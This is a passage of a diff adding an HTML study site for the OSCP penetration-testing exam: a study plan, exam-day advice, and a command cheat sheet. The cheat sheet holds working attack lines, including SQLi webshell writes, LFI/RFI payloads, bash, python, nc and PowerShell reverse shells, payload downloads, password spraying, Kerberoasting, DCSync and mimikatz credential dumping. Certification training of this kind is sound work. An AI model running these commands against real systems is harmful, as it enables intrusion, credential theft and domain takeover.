+          <div class="frat">Small topic, but the AD set is often unreachable without it. Get ligolo-ng and chisel to reflex, because being unable to pivot can cost you the whole 40 points.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Password &amp; Hash Attacks</span><span class="exval">cross-cutting</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:6%"></i></div><span class="pct">6%</span></div>
+          <div class="frat">Cracking roast hashes, spraying, hydra, hashcat modes and rules. Threads through both the standalones and the AD set. Know your hashcat modes cold.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Report, Notes &amp; Exam Sims</span><span class="exval">pass/fail hygiene</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:5%"></i></div><span class="pct">5%</span></div>
+          <div class="frat">A rooted box with no screenshot is lost points. Build the report template early and run full 24-hour exam simulations before the real thing. This is where organised people pass.</div>
+        </div>
+      </div>
+
+      <div class="two" style="margin-top:18px">
+        <div class="callout"><span class="ic">[*]</span><p><strong>One-line takeaway:</strong> spend roughly <strong>a third of your effort on Active Directory</strong>, keep enumeration a constant background discipline, and split the rest across the web foothold and both privesc paths. Pivoting and reporting are small but can silently cost you big.</p></div>
+        <div class="callout" style="border-left-color:var(--owned)"><span class="ic" style="color:var(--owned)">[+]</span><p><strong>Scale it to yourself.</strong> These are shares of your study effort, so apply them to whatever time you actually have. The ratios are the point, not any fixed total.</p></div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<!-- ==================== PLAN ==================== -->
+<div class="page" id="page-plan">
+  <main class="wrap">
+    <section style="border:none">
+      <div class="kicker" style="padding-top:36px">Phase-based route // mapped to PEN-200 modules</div>
+      <div class="sec-head" style="margin-top:14px"><h2 style="font-family:var(--serif);font-size:clamp(26px,4vw,38px);margin:0">Preparation Plan</h2></div>
+      <p class="lead">Build skills first, grind machines second, simulate the exam last. Once you reach the machine phases, own at least one box per session and write notes on every one. The module names in each phase map to the official PEN-200 course, so you can march through both together.</p>
+      <div class="callout"><span class="ic">[!]</span><p><strong>Reality check.</strong> This route assumes you already have working Linux and networking fundamentals and can study consistently. If you are closer to a beginner, keep the exact same order and just move through the early phases more slowly. The sequence is what matters, not the pace.</p></div>
+
+      <div style="margin-top:20px">
+        <div class="week"><div><div class="wnum">Phase</div><div class="wbig">01</div></div><div>
+          <h3>Foundations, Enumeration &amp; the Web</h3><div class="goal">OBJECTIVE: never miss a service, never miss a web vuln</div>
+          <ul class="tasklist">
+            <li>Lock in your note-taking system (Obsidian, CherryTree, or Sublime with templates) before anything else</li>
+            <li>Master enumeration: nmap deep dives, UDP, ffuf and feroxbuster, vhost fuzzing, service versioning</li>
+            <li>Web attacks: manual SQLi, LFI/RFI, file-upload bypasses, command injection, traversal, auth bypass</li>
+            <li>PEN-200 modules: Information Gathering, Vulnerability Scanning, Web Application Attacks, SQL Injection. Do the exercises.</li>
+            <li>Warm-up boxes: HTB Lame, Blue, Legacy, Bashed, Shocker</li>
+          </ul>
+          <div class="chips"><span class="chip">nmap</span><span class="chip">ffuf</span><span class="chip">manual SQLi</span><span class="chip">LFI/RFI</span><span class="chip">file upload</span></div>
+        </div></div>
+
+        <div class="week"><div><div class="wnum">Phase</div><div class="wbig">02</div></div><div>
+          <h3>Privilege Escalation: Linux &amp; Windows</h3><div class="goal">OBJECTIVE: turn any shell into root or SYSTEM methodically</div>
+          <ul class="tasklist">
+            <li>Linux: sudo/GTFOBins, SUID, cron, capabilities, PATH hijack, kernel, writable configs</li>
+            <li>Windows: service misconfigs, unquoted paths, token privileges (Potato family), AlwaysInstallElevated, DLL hijack</li>
+            <li>Run and read linpeas, winpeas, and pspy. Interpret the output, do not just paste it.</li>
+            <li>PEN-200 modules: Linux Privilege Escalation, Windows Privilege Escalation, Locating Public Exploits, Fixing Exploits</li>
+            <li>Boxes: HTB Optimum, Devel, Nibbles, Valentine, Jerry, Arctic</li>
+          </ul>
+          <div class="chips"><span class="chip">GTFOBins</span><span class="chip">linpeas</span><span class="chip">winpeas</span><span class="chip">Potato</span><span class="chip">exploit fixing</span></div>
+        </div></div>
+
+        <div class="week"><div><div class="wnum">Phase</div><div class="wbig">03</div></div><div>
+          <h3>Active Directory: the 40-point block</h3><div class="goal">OBJECTIVE: own a domain from one foothold, reliably</div>
+          <ul class="tasklist">
+            <li>Enumeration: BloodHound/SharpHound, ldapdomaindump, rpcclient, enum4linux-ng, PowerView</li>
+            <li>Credential attacks: AS-REP roasting, Kerberoasting, spraying, GPP passwords, SMB shares</li>
+            <li>Lateral movement: pass-the-hash, evil-winrm, psexec/wmiexec, RDP, credential reuse</li>
+            <li>Escalation to DC: DCSync, delegation, ACL abuse, DnsAdmins, secretsdump</li>
+            <li>PEN-200 modules: AD Introduction and Enumeration, Attacking AD Authentication, Lateral Movement in AD</li>
+            <li>Boxes: HTB Forest, Sauna, Active, Blackfield, Resolute, Cascade, plus PG Hutch and Resourced</li>
+          </ul>
+          <div class="chips"><span class="chip">BloodHound</span><span class="chip">Kerberoast</span><span class="chip">AS-REP</span><span class="chip">PtH</span><span class="chip">DCSync</span></div>
+        </div></div>
+
+        <div class="week"><div><div class="wnum">Phase</div><div class="wbig">04</div></div><div>
+          <h3>Tunneling &amp; Machine Grinding: breadth</h3><div class="goal">OBJECTIVE: speed and pattern recognition across everything</div>
+          <ul class="tasklist">
+            <li><strong>Proving Grounds Practice is the closest proxy to the exam.</strong> Work through it steadily, mixing OS types.</li>
+            <li>Add tunneling: chisel, ssh -L/-R/-D, proxychains, ligolo-ng (you need this for AD pivots)</li>
+            <li>Alternate Linux, Windows, and AD so no skill goes cold</li>
+            <li>Track every box: foothold vector, privesc vector, time to root</li>
+            <li>Redo any box you needed a hint on, cold, a few days later</li>
+            <li>PEN-200 modules: Port Redirection and SSH Tunneling, Tunneling Through Deep Packet Inspection, The Metasploit Framework</li>
+          </ul>
+          <div class="chips"><span class="chip">PG Practice</span><span class="chip">chisel</span><span class="chip">ligolo-ng</span><span class="chip">proxychains</span></div>
+        </div></div>
+
+        <div class="week"><div><div class="wnum">Phase</div><div class="wbig">05</div></div><div>
+          <h3>Depth, Challenge Labs &amp; Weak Spots</h3><div class="goal">OBJECTIVE: kill weaknesses and harden your process</div>
+          <ul class="tasklist">
+            <li>Put the bulk of your time on your slowest category (usually Windows privesc or AD pivoting)</li>
+            <li>Run the OffSec Challenge Labs (Medtech, Relia, Zeus, Secura). They mirror the exam AD chain.</li>
+            <li>Time-box each box; if stuck, note exactly where, check the walkthrough, then redo it cold</li>
+            <li>Start your <strong>report template</strong> and screenshot as you go</li>
+            <li>Do several full AD chains in this phase</li>
+            <li>PEN-200 module: Assembling the Pieces, the full end-to-end walkthrough</li>
+          </ul>
+          <div class="chips"><span class="chip">Challenge Labs</span><span class="chip">report template</span><span class="chip">full AD chains</span></div>
+        </div></div>
+
+        <div class="week"><div><div class="wnum">Phase</div><div class="wbig">06</div></div><div>
+          <h3>Exam Simulation &amp; Report</h3><div class="goal">OBJECTIVE: rehearse the real thing under real conditions</div>
+          <ul class="tasklist">
+            <li>Run <strong>full 24-hour exam simulations</strong>: 3 standalone plus 1 AD set, unseen, no walkthroughs</li>
+            <li>Practice the whole loop, including <strong>writing the report</strong> from your screenshots</li>
+            <li>Lock your checklist, tooling, VPN config, Kali snapshot, and offline exploits</li>
+            <li>As the exam nears, switch to light review only. Re-read your own notes and sleep properly.</li>
+            <li>Start the exam when you are freshest, and plan your food, water, and breaks</li>
+            <li>PEN-200 stage: Trying Harder, the Challenge Labs</li>
+          </ul>
+          <div class="chips"><span class="chip">24h simulation</span><span class="chip">report dry-run</span><span class="chip">rest</span></div>
+        </div></div>
+      </div>
+    </section>
+
+    <section id="examday">
+      <div class="sec-head"><span class="sec-num">&gt;_</span><h2>Exam-day battle plan</h2></div>
+      <div class="flow">
+        <div class="step"><span class="st">1</span><div><h4>Start all enumeration at once</h4><p>Kick off full-port nmap on every target the moment the VPN connects. Enumeration runs while you think.</p></div></div>
+        <div class="step"><span class="st">2</span><div><h4>Go for the AD set first</h4><p>40 points, the biggest block. If the domain falls, you are most of the way to 70. Attack it early while you are sharp.</p></div></div>
+        <div class="step"><span class="st">3</span><div><h4>Time-box each stuck point</h4><p>No new leads for a while? Rotate to another target. A fresh box resets your brain, and you will often crack the old one afterwards.</p></div></div>
+        <div class="step"><span class="st">4</span><div><h4>Screenshot everything, immediately</h4><p>Every flag, shell, and key command, with the IP visible, captured as you go. Reconstructing evidence later loses hours and points.</p></div></div>
+        <div class="step"><span class="st">5</span><div><h4>Bank 70, then push for margin</h4><p>Once you cross 70 with verified proof, you have passed. Bank it mentally and keep going, but protect the sleep you need for the report.</p></div></div>
+        <div class="step"><span class="st">6</span><div><h4>Sleep, then write the report</h4><p>You get a separate 24-hour window after the hacking phase. Sleep first. The report has to let a grader reproduce every step.</p></div></div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<!-- ==================== CHEAT SHEET ==================== -->
+<div class="page" id="page-cheatsheet">
+  <div class="subnav"><div class="wrap" id="cheatnav">
+    <a data-cheat="c-enum">Enumeration</a>
+    <a data-cheat="c-web">Web</a>
+    <a data-cheat="c-pass">Passwords</a>
+    <a data-cheat="c-shells">Shells &amp; Transfer</a>
+    <a data-cheat="c-lin">Linux PrivEsc</a>
+    <a data-cheat="c-win">Windows PrivEsc</a>
+    <a data-cheat="c-ad">Active Directory</a>
+    <a data-cheat="c-pivot">Pivoting</a>
+    <a data-cheat="c-msf">Metasploit / BOF</a>
+  </div></div>
+  <main class="wrap">
+    <div style="padding-top:24px">
+      <div class="kicker">Full command reference</div>
+      <h2 style="font-family:var(--serif);font-size:clamp(26px,4vw,36px);margin:12px 0 6px">The OSCP Cheat Sheet</h2>
+      <p class="lead">Every command you'll type a thousand times, organised by domain. Replace <code>$IP</code> / <code>$U</code> / <code>$P</code> / <code>$D</code> with your target, user, pass, domain. Build your <em>own</em> version as you go - that's the one you'll trust in the exam.</p>
+    </div>
+
+    <!-- ENUM -->
+    <div class="cheat-block" id="c-enum">
+      <h3><span class="tag">01</span> Enumeration &amp; Recon</h3>
+      <p>The single most important skill. 90% of "I was stuck for hours" ends with an unchecked port, param, or share. Enumerate until there's no unexplored surface, <em>then</em> exploit.</p>
+
+      <div class="cheat-sub"># Nmap</div>
+      <div class="code"><pre><span class="c"># 1. Fast full TCP port sweep</span>
+<span class="k">nmap</span> -p- --min-rate 5000 -T4 <span class="s">$IP</span> -oN nmap/allports.txt
+<span class="c"># 2. Deep scan on the open ports only</span>
+<span class="k">nmap</span> -p22,80,445 -sC -sV -O -oN nmap/deep.txt <span class="s">$IP</span>
+<span class="c"># 3. UDP top ports (never skip - SNMP/TFTP/DNS live here)</span>
+<span class="k">sudo</span> nmap -sU --top-ports 100 -oN nmap/udp.txt <span class="s">$IP</span>
+<span class="c"># Targeted NSE scripts</span>
+<span class="k">nmap</span> -p445 --script smb-vuln-* <span class="s">$IP</span>
+<span class="k">nmap</span> -p80 --script http-enum,http-title <span class="s">$IP</span></pre></div>
+
+      <div class="cheat-sub"># HTTP / Web discovery</div>
+      <div class="code"><pre><span class="k">whatweb</span> http://<span class="s">$IP</span>            <span class="c"># tech fingerprint</span>
+<span class="k">nikto</span> -h http://<span class="s">$IP</span>
+<span class="c"># Directory / file brute force</span>
+<span class="k">feroxbuster</span> -u http://<span class="s">$IP</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
+<span class="k">gobuster</span> dir -u http://<span class="s">$IP</span> -w /usr/share/wordlists/dirb/common.txt -x php,txt
+<span class="c"># ffuf: dirs, extensions, params, vhosts</span>
+<span class="k">ffuf</span> -u http://<span class="s">$IP</span>/FUZZ -w wordlist.txt -e .php,.bak
+<span class="k">ffuf</span> -u http://<span class="s">$IP</span>/page?FUZZ=1 -w params.txt -fs 0        <span class="c"># hidden params</span>
+<span class="k">ffuf</span> -u http://<span class="s">$IP</span> -H <span class="s">"Host: FUZZ.target.tld"</span> -w subdomains.txt -fs 0   <span class="c"># vhosts</span>
+<span class="c"># WordPress</span>
+<span class="k">wpscan</span> --url http://<span class="s">$IP</span> --enumerate u,ap,at --api-token &lt;t&gt;</pre></div>
+
+      <div class="cheat-sub"># SMB (445/139)</div>
+      <div class="code"><pre><span class="k">enum4linux-ng</span> -A <span class="s">$IP</span>
+<span class="k">smbclient</span> -L //<span class="s">$IP</span> -N            <span class="c"># list shares, null session</span>
+<span class="k">smbclient</span> //<span class="s">$IP</span>/share -N
+<span class="k">smbmap</span> -H <span class="s">$IP</span> -u '' -p ''         <span class="c"># perms per share</span>
+<span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u '' -p '' --shares
+<span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u <span class="s">$U</span> -p <span class="s">$P</span> --shares --users --pass-pol</pre></div>
+
+      <div class="cheat-sub"># SNMP (UDP 161)</div>
+      <div class="code"><pre><span class="k">onesixtyone</span> -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <span class="s">$IP</span>
+<span class="k">snmpwalk</span> -v2c -c public <span class="s">$IP</span>
+<span class="k">snmpwalk</span> -v2c -c public <span class="s">$IP</span> 1.3.6.1.4.1.77.1.2.25   <span class="c"># users</span>
+<span class="k">snmpwalk</span> -v2c -c public <span class="s">$IP</span> 1.3.6.1.2.1.25.4.2.1.2  <span class="c"># running processes</span></pre></div>
+
+      <div class="cheat-sub"># DNS / FTP / SMTP / NFS / LDAP / DBs</div>
+      <div class="code"><pre><span class="c"># DNS zone transfer</span>
+<span class="k">dig</span> axfr @<span class="s">$IP</span> domain.tld
+<span class="k">dnsrecon</span> -d domain.tld -n <span class="s">$IP</span> -t axfr
+<span class="c"># FTP anon</span>
+<span class="k">ftp</span> <span class="s">$IP</span>            <span class="c"># user: anonymous / pass: anything</span>
+<span class="c"># SMTP user enum</span>
+<span class="k">smtp-user-enum</span> -M VRFY -U users.txt -t <span class="s">$IP</span>
+<span class="c"># NFS</span>
+<span class="k">showmount</span> -e <span class="s">$IP</span>
+<span class="c"># LDAP</span>
+<span class="k">ldapsearch</span> -x -H ldap://<span class="s">$IP</span> -b <span class="s">"dc=domain,dc=tld"</span>
+<span class="c"># MSSQL / MySQL / Redis</span>
+<span class="k">impacket-mssqlclient</span> <span class="s">$U</span>:<span class="s">$P</span>@<span class="s">$IP</span> -windows-auth
+<span class="k">mysql</span> -h <span class="s">$IP</span> -u root -p
+<span class="k">redis-cli</span> -h <span class="s">$IP</span></pre></div>
+    </div>
+
+    <!-- WEB -->
+    <div class="cheat-block" id="c-web">
+      <h3><span class="tag">02</span> Web Exploitation</h3>
+      <p>Web is the most common foothold. Test every input by hand - Burp Community (repeater/proxy) is your friend; the active scanner is banned in the exam.</p>
+
+      <div class="cheat-sub"># SQL Injection (manual)</div>
+      <div class="code"><pre><span class="c"># Detect</span>  '   "   ' OR 1=1-- -   ' AND 1=2-- -
+<span class="c"># Auth bypass</span>  admin' -- -    ' OR '1'='1
+<span class="c"># UNION: find column count, then reflect</span>
+' ORDER BY 5-- -
+' UNION SELECT 1,2,3,4,5-- -
+' UNION SELECT 1,@@version,database(),user(),5-- -
+<span class="c"># Dump (MySQL)</span>
+' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -
+' UNION SELECT 1,group_concat(user,0x3a,password),3,4,5 FROM users-- -
+<span class="c"># MSSQL stacked → RCE</span>
+'; EXEC xp_cmdshell 'whoami'-- -
+<span class="c"># SQLi → shell (MySQL file write)</span>
+' UNION SELECT 1,<span class="s">"&lt;?php system($_GET['c']);?&gt;"</span>,3 INTO OUTFILE '/var/www/html/s.php'-- -</pre></div>
+
+      <div class="cheat-sub"># LFI / RFI</div>
+      <div class="code"><pre><span class="c"># Basic + traversal</span>
+http://<span class="s">$IP</span>/?page=../../../../etc/passwd
+<span class="c"># PHP filter to read source</span>
+?page=php://filter/convert.base64-encode/resource=index.php
+<span class="c"># Log poisoning → RCE (inject into User-Agent, then include the log)</span>
+?page=/var/log/apache2/access.log
+<span class="c"># data / input wrappers</span>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+<span class="c"># RFI (allow_url_include=On)</span>
+?page=http://<span class="s">$YOUR_IP</span>/shell.php</pre></div>
+
+      <div class="cheat-sub"># File upload bypass</div>
+      <div class="code"><pre><span class="c"># Extension tricks</span>  shell.php  .phtml .php5 .phar .pHp
+<span class="c"># Double ext / null</span>  shell.php.jpg   shell.php%00.jpg
+<span class="c"># Content-Type spoof</span>  Content-Type: image/png
+<span class="c"># Magic bytes</span>  add GIF89a; at top of file
+<span class="c"># .htaccess trick (Apache)</span>
+AddType application/x-httpd-php .xyz</pre></div>
+
+      <div class="cheat-sub"># Command injection · SSTI · XXE</div>
+      <div class="code"><pre><span class="c"># Command injection separators</span>
+; | || &amp;&amp; `id` $(id) %0a
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/<span class="s">$IP</span>/443 0&gt;&amp;1'
+<span class="c"># SSTI detect</span>  {{7*7}}  ${7*7}  &lt;%= 7*7 %&gt;
+<span class="c"># Jinja2 RCE</span>
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+<span class="c"># XXE</span>
+&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;</pre></div>
+      <div class="note"><b>Method:</b> map the app first (dirbust, read JS, note params), then test one class of bug at a time. Note versions of every CMS/framework - a public exploit is often faster than a manual bug.</div>
+    </div>
+
+    <!-- PASSWORDS -->
+    <div class="cheat-block" id="c-pass">
+      <h3><span class="tag">03</span> Password &amp; Hash Attacks</h3>
+      <div class="cheat-sub"># Online brute force - hydra</div>
+      <div class="code"><pre><span class="k">hydra</span> -L users.txt -P rockyou.txt ssh://<span class="s">$IP</span>
+<span class="k">hydra</span> -l admin -P rockyou.txt ftp://<span class="s">$IP</span>
+<span class="k">hydra</span> -l admin -P pass.txt <span class="s">$IP</span> http-post-form \
+  <span class="s">"/login.php:user=^USER^&amp;pass=^PASS^:Invalid"</span>
+<span class="k">hydra</span> -L users -P pass rdp://<span class="s">$IP</span></pre></div>
+
+      <div class="cheat-sub"># Offline cracking - hashcat &amp; john</div>
+      <div class="code"><pre><span class="k">hashid</span> '&lt;hash&gt;'          <span class="c"># or hash-identifier</span>
+<span class="k">hashcat</span> -m 0    hash rockyou.txt        <span class="c"># MD5</span>
+<span class="k">hashcat</span> -m 1000 hash rockyou.txt        <span class="c"># NTLM</span>
+<span class="k">hashcat</span> -m 1800 hash rockyou.txt        <span class="c"># sha512crypt ($6$)</span>
+<span class="k">hashcat</span> -m 18200 asrep rockyou.txt      <span class="c"># AS-REP</span>
+<span class="k">hashcat</span> -m 13100 krb5tgs rockyou.txt    <span class="c"># Kerberoast</span>
+<span class="k">hashcat</span> -m 1000 hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+<span class="k">john</span> --wordlist=rockyou.txt hash.txt
+<span class="c"># unshadow first for /etc/shadow</span>
+<span class="k">unshadow</span> passwd shadow &gt; combined; john combined</pre></div>
+
+      <div class="cheat-sub"># Build / mutate wordlists</div>
+      <div class="code"><pre><span class="k">cewl</span> http://<span class="s">$IP</span> -w custom.txt          <span class="c"># scrape site words</span>
+<span class="k">crunch</span> 8 8 -t Pass@%%% &gt; wl.txt          <span class="c"># patterns</span>
+<span class="c"># Common default creds: admin:admin, tomcat:s3cret, root:root</span></pre></div>
+    </div>
+
+    <!-- SHELLS -->
+    <div class="cheat-block" id="c-shells">
+      <h3><span class="tag">04</span> Shells, Upgrades &amp; File Transfer</h3>
+      <div class="cheat-sub"># Reverse shells (see revshells.com)</div>
+      <div class="code"><pre><span class="c"># Bash</span>
+bash -i &gt;&amp; /dev/tcp/<span class="s">$IP</span>/443 0&gt;&amp;1
+<span class="c"># Python</span>
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<span class="s">$IP</span>",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+<span class="c"># nc (with -e, or mkfifo variant)</span>
+nc <span class="s">$IP</span> 443 -e /bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <span class="s">$IP</span> 443 &gt;/tmp/f
+<span class="c"># PowerShell (one-liner base of it)</span>
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<span class="s">$IP</span>',443);$s=$c.GetStream();..."</pre></div>
+
+      <div class="cheat-sub"># Listener + TTY upgrade</div>
+      <div class="code"><pre><span class="k">rlwrap</span> nc -lvnp 443           <span class="c"># rlwrap = arrow keys/history</span>
+<span class="c"># Upgrade a dumb shell to full TTY:</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="c"># Ctrl-Z</span>
+stty raw -echo; fg
+<span class="c"># then in shell:</span>
+export TERM=xterm; stty rows 38 cols 116</pre></div>
+
+      <div class="cheat-sub"># File transfer</div>
+      <div class="code"><pre><span class="c"># Serve from attacker</span>
+python3 -m http.server 80
+impacket-smbserver share . -smb2support        <span class="c"># SMB (Windows)</span>
+<span class="c"># Linux pull</span>
+wget http://<span class="s">$IP</span>/linpeas.sh ; curl http://<span class="s">$IP</span>/f -o f
+<span class="c"># Windows pull</span>
+certutil -urlcache -f http://<span class="s">$IP</span>/nc.exe nc.exe
+powershell iwr -uri http://<span class="s">$IP</span>/x.exe -o x.exe
+copy \\<span class="s">$IP</span>\share\x.exe .            <span class="c"># from impacket-smbserver</span></pre></div>
+    </div>
+
+    <!-- LINUX -->
+    <div class="cheat-block" id="c-lin">
+      <h3><span class="tag">05</span> Linux Privilege Escalation</h3>
+      <p>Enumerate methodically, then match findings against known techniques. Run the automated tools <em>and read their output</em> - the answer is usually flagged in yellow.</p>
+      <div class="cheat-sub"># Automated + manual recon</div>
+      <div class="code"><pre><span class="k">./linpeas.sh</span> | tee linpeas.txt
+<span class="k">./pspy64</span>                       <span class="c"># watch cron / hidden procs live</span>
+<span class="k">id</span>; sudo -l; uname -a
+<span class="k">find</span> / -perm -4000 -type f 2&gt;/dev/null      <span class="c"># SUID</span>
+<span class="k">getcap</span> -r / 2&gt;/dev/null                      <span class="c"># capabilities</span>
+<span class="k">cat</span> /etc/crontab; ls -la /etc/cron.*
+<span class="k">find</span> / -writable -type d 2&gt;/dev/null</pre></div>
+
+      <div class="cheat-sub"># The high-yield vectors</div>
+      <div class="code"><pre><span class="c"># sudo -l → look up the binary on GTFOBins</span>
+sudo /usr/bin/find . -exec /bin/sh \; -quit
+sudo vim -c ':!/bin/sh'
+<span class="c"># SUID via GTFOBins (e.g. suid nmap old, cp, bash)</span>
+/usr/bin/bash -p
+<span class="c"># Capability cap_setuid</span>
+/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+<span class="c"># Writable /etc/passwd - add a root user</span>
+openssl passwd -1 -salt x pass       <span class="c"># make hash, append: hacker:HASH:0:0::/root:/bin/bash</span>
+<span class="c"># PATH hijack (script calls a bare command)</span>
+export PATH=/tmp:$PATH; echo '/bin/bash' &gt; /tmp/service; chmod +x /tmp/service
+<span class="c"># NFS no_root_squash - mount, drop a SUID binary as root</span>
+<span class="c"># Cron running a writable script → add reverse shell</span></pre></div>
+
+      <div class="cheat-sub"># Kernel exploits (last resort)</div>
+      <div class="code"><pre><span class="c"># Identify → searchsploit; well-known:</span>
+<span class="c"># PwnKit (pkexec) CVE-2021-4034 · DirtyPipe 5.8-5.16 · DirtyCow &lt;=3.x</span>
+searchsploit linux kernel 3.13
+<span class="c"># Docker / lxd group = instant root</span>
+id | grep -E 'docker|lxd'</pre></div>
+    </div>
+
+    <!-- WINDOWS -->
+    <div class="cheat-block" id="c-win">
+      <h3><span class="tag">06</span> Windows Privilege Escalation</h3>
+      <div class="cheat-sub"># Recon</div>
+      <div class="code"><pre><span class="k">.\winPEASx64.exe</span> quiet
+<span class="k">whoami</span> /priv                <span class="c"># SeImpersonate/SeBackup/etc → key!</span>
+<span class="k">whoami</span> /all
+<span class="k">systeminfo</span>                   <span class="c"># OS/patch level for kernel exploits</span>
+<span class="k">wmic</span> service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows"</pre></div>
+
+      <div class="cheat-sub"># Token privileges → SYSTEM</div>
+      <div class="code"><pre><span class="c"># SeImpersonate / SeAssignPrimaryToken (web/service accounts):</span>
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\PrintSpoofer64.exe -i -c cmd
+.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
+<span class="c"># SeBackupPrivilege → grab SAM/SYSTEM or NTDS</span>
+reg save hklm\sam sam.hive ; reg save hklm\system system.hive</pre></div>
+
+      <div class="cheat-sub"># Service &amp; config misconfigs</div>
+      <div class="code"><pre><span class="c"># Unquoted service path - plant exe in a space gap</span>
+<span class="c"># Weak service perms (accesschk) → change binPath</span>
+sc config vulnsvc binPath= "C:\temp\rev.exe" ; sc start vulnsvc
+<span class="c"># AlwaysInstallElevated (both keys = 1) → malicious msi</span>
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="s">$IP</span> LPORT=443 -f msi -o x.msi
+msiexec /quiet /qn /i x.msi
+<span class="c"># Stored creds</span>
+cmdkey /list ; runas /savecred /user:admin cmd.exe</pre></div>
+
+      <div class="cheat-sub"># Credential hunting</div>
+      <div class="code"><pre>findstr /si password *.txt *.ini *.config *.xml
+<span class="c"># unattend / sysprep / Groups.xml (GPP)</span>
+type C:\Windows\Panther\Unattend.xml
+reg query HKLM /f password /t REG_SZ /s</pre></div>
+    </div>
+
+    <!-- AD -->
+    <div class="cheat-block" id="c-ad">
+      <h3><span class="tag">07</span> Active Directory <span style="font-family:var(--mono);font-size:12px;color:var(--owned);font-weight:400">· the 40-point block</span></h3>
+      <p>The exam AD set is a chain: get a foothold, enumerate with BloodHound, harvest creds, move laterally, reach the DC. Practice the whole flow until it's routine.</p>
+
+      <div class="cheat-sub"># Enumerate</div>
+      <div class="code"><pre><span class="c"># BloodHound collection (remote)</span>
+bloodhound-python -u <span class="s">$U</span> -p <span class="s">$P</span> -d <span class="s">$D</span> -ns <span class="s">$IP</span> -c all
+<span class="c"># SharpHound on host:  .\SharpHound.exe -c All</span>
+<span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u <span class="s">$U</span> -p <span class="s">$P</span> --users --groups --pass-pol
+<span class="k">rpcclient</span> -U <span class="s">$U</span>%<span class="s">$P</span> <span class="s">$IP</span>       <span class="c"># enumdomusers, queryuser</span>
+<span class="k">ldapdomaindump</span> -u <span class="s">$D</span>\\<span class="s">$U</span> -p <span class="s">$P</span> <span class="s">$IP</span></pre></div>
+
+      <div class="cheat-sub"># Credential attacks</div>
+      <div class="code"><pre><span class="c"># AS-REP roast (users w/ no preauth) - no creds needed</span>
+impacket-GetNPUsers <span class="s">$D</span>/ -usersfile users.txt -no-pass -dc-ip <span class="s">$IP</span>
+<span class="c"># Kerberoast (needs any valid creds)</span>
+impacket-GetUserSPNs <span class="s">$D</span>/<span class="s">$U</span>:<span class="s">$P</span> -dc-ip <span class="s">$IP</span> -request
+<span class="c"># Password spray</span>
+crackmapexec smb <span class="s">$IP</span> -u users.txt -p 'Summer2024!' --continue-on-success
+<span class="c"># GPP cpassword in SYSVOL → gpp-decrypt</span>
+<span class="c"># Crack the roast hashes with hashcat -m 18200 / -m 13100</span></pre></div>
+
+      <div class="cheat-sub"># Lateral movement</div>
+      <div class="code"><pre><span class="k">evil-winrm</span> -i <span class="s">$IP</span> -u <span class="s">$U</span> -p <span class="s">$P</span>
+<span class="k">evil-winrm</span> -i <span class="s">$IP</span> -u <span class="s">$U</span> -H <span class="s">$NThash</span>       <span class="c"># pass-the-hash</span>
+<span class="k">impacket-psexec</span> <span class="s">$D</span>/<span class="s">$U</span>:<span class="s">$P</span>@<span class="s">$IP</span>          <span class="c"># SYSTEM</span>
+<span class="k">impacket-wmiexec</span> <span class="s">$D</span>/<span class="s">$U</span>@<span class="s">$IP</span> -hashes :<span class="s">$NThash</span>
+<span class="k">crackmapexec</span> smb <span class="s">$IP</span>/24 -u <span class="s">$U</span> -H <span class="s">$NThash</span>    <span class="c"># spray hash across subnet</span></pre></div>
+
+      <div class="cheat-sub"># Domain domination</div>
+      <div class="code"><pre><span class="c"># Dump secrets / DCSync</span>
+impacket-secretsdump <span class="s">$D</span>/<span class="s">$U</span>:<span class="s">$P</span>@<span class="s">$IP</span>
+impacket-secretsdump -just-dc <span class="s">$D</span>/admin@<span class="s">$DC</span>     <span class="c"># DCSync (needs replication rights)</span>
+<span class="c"># mimikatz on host</span>
+sekurlsa::logonpasswords ; lsadump::dcsync /user:krbtgt
+<span class="c"># ACL abuse from BloodHound (GenericAll/WriteDACL): force-change pw</span>
+net rpc password "victim" "NewPass1!" -U "<span class="s">$D</span>/<span class="s">$U</span>%<span class="s">$P</span>" -S <span class="s">$IP</span>
+<span class="c"># Delegations, DnsAdmins, RBCD = box-specific escalations</span></pre></div>
+      <div class="note"><b>Pivot reminder:</b> the DC is usually only reachable <em>through</em> the foothold host - set up ligolo-ng / chisel first (see Pivoting) or your impacket calls won't route.</div>
+    </div>
+
+    <!-- PIVOT -->
+    <div class="cheat-block" id="c-pivot">
+      <h3><span class="tag">08</span> Tunneling &amp; Pivoting</h3>
+      <div class="cheat-sub"># ligolo-ng (cleanest for AD)</div>
+      <div class="code"><pre><span class="c"># Attacker: add interface + route the internal subnet</span>
+sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
+./proxy -selfcert
